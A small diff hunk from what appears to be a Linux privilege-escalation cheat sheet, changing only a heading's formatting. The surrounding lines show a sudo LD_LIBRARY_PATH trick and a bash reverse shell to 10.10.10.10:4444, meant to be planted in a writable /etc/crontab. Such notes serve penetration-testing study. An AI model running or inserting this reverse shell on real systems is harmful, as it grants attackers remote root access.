@@ -56,7 +56,7 @@ c. sudo program with the LD_LIBRARY_PATH
 ```sudo LD_LIBRARY_PATH=/tmp <programname>```
 
 
-### > Cron job if it's writable on /etc/crontab file (can use any available type of reverse shell http://revshells.com/ ):
+* ### Cron job if it's writable on /etc/crontab file (can use any available type of reverse shell http://revshells.com/ ):
 ```#!/bin/bash
 bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 ```
